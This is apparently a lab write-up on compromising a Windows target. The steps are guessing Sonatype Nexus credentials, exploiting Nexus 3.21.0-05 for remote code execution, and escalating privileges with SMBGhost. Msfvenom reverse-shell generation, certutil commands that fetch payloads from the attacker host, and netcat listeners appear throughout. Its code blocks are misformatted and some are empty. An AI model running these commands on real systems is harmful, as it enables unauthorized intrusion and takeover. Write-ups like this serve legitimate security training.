## Summary
> Initial Foothold can be gain through password guessing or bruteforcing common passwords. After that `Sonatype Nexus` application remote code execution vulnerability can be exploited and gain Remote Code Execution on the target. Finally, the `SMBGhost` vulnerability can be exploited to escalate privileges.

## Enumeration
### Nmap
We'll start off with a simple Nmap scan.

```bash
kali@kali:~$ sudo nmap 192.168.140.61
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-05 01:33 EST
Nmap scan report for 192.168.140.61
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
```
### Sonatype Nexus
Browsing to the website on port 8081, we find an installation of Sonatype Nexus. A quick online search reveals that there are no default credentials we can exploit. However, after a few educated guesses, we log in as `nexus:nexus`.

According to the information in the top-left corner, the target is running `Sonatype Nexus version 3.21.0-05`.

## Exploitation
### Sonatype Nexus Authenticated Code Execution
An EDB search reveals that version 3.21.0-05 of Sonatype Nexus is vulnerable to a remote code execution exploit. To run the exploit, we'll first generate an MSFVenom reverse shell payload.

```bash
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.118.3 LPORT=8081
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
We'll host our payload over HTTP.

```bash
kali@kali:~$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Let's start a Netcat handler on port 8081 to catch our reverse shell.

```bash
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
```
We'll modify the exploit as follows:

```bash
URL='http://192.168.140.61:8081'
CMD='cmd.exe /c certutil -urlcache -split -f http://192.168.118.3/shell.exe shell.exe'
USERNAME='nexus'
PASSWORD='nexus'
Next, we'll run the exploit to download our payload.

kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
```
We'll make a few more modifications, this time executing our payload.

```bash
CMD='cmd.exe /c shell.exe'
```
Let's run the exploit again.

```bash
kali@kali:~$ python exploit.py 
Logging in
Logged in successfully
```
### Command executed
Finally, we catch our reverse shell as nathan.

```bash
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...

## Escalation
### Installed Patches Enumeration
Listing the installed KBs, we learn that the most recently installed patch is `KB4540673`. This KB was released in March 2020, which means our target is potentially vulnerable to SMBGhost.

### SMB Settings Enumeration
To further confirm the SMBGhost vulnerability, we check the listening ports and find that port 445 is open.
```bash

### SMBGhost Exploitation
We'll use this exploit against the SMB service. Starting with line 204 in exploit.cpp, we'll replace the shellcode with a reverse shell.

```
Using Visual Studio (in our case Community 2019 with C++ Desktop Development installed), we'll set the target to x64 and Release and compile the exploit. We can host the compiled exploit on our attack machine over HTTP and then download it to the target using the low-privileged shell.

```bash
C:\Users\nathan\Nexus\nexus-3.21.0-05>certutil -urlcache -split -f http://192.168.118.3/cve-2020-0796-local.exe cve-2020-0796-local.exe
certutil -urlcache -split -f http://KALI/cve-2020-0796-local.exe cve-2020-0796-local.exe
****  Online  ****
  000000  ...
  01e600
CertUtil: -URLCache command completed successfully.
```
Let's start a Netcat handler to catch our reverse shell.

```bash
kali@kali:~$ nc -lvp 8081
listening on [any] 8081 ...
We can now trigger the exploit.
